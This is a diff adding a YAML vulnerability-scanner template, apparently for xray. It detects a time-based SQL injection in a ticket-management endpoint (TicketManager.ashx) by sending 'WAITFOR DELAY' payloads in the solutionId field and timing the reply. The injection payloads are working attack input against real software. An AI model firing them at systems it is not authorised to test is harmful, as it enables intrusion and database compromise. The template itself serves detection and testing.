@@ -1,0 +1,35 @@
+name: poc-yaml-zhongchengkexin-TicketManager.ashx-sql
+transport: http
+
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /SystemManager/Api/TicketManager.ashx
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+      body: Method=GetReServeOrder&solutionId=1' WAITFOR DELAY '0:0:4'--
+    expression: response.latency >= 4000 && response.latency <= 5000
+  r1:
+    request:
+      method: POST
+      path: /SystemManager/Api/TicketManager.ashx
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+      body: Method=GetReServeOrder&solutionId=1' WAITFOR DELAY '0:0:8'--
+    expression: response.latency >= 8000 && response.latency <= 9000
+
+expression: r0() && r1()
+ 
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486372&idx=1&sn=c99f323e3324fe1ff4bc158ecdc87fce&chksm=c267be97f510378197ab8ab5af8eba56b928bacfb26ba818ff6a12a4e6d06c3e7d360f1ed089&token=661111678&lang=zh_CN#rd
+
+
+
+
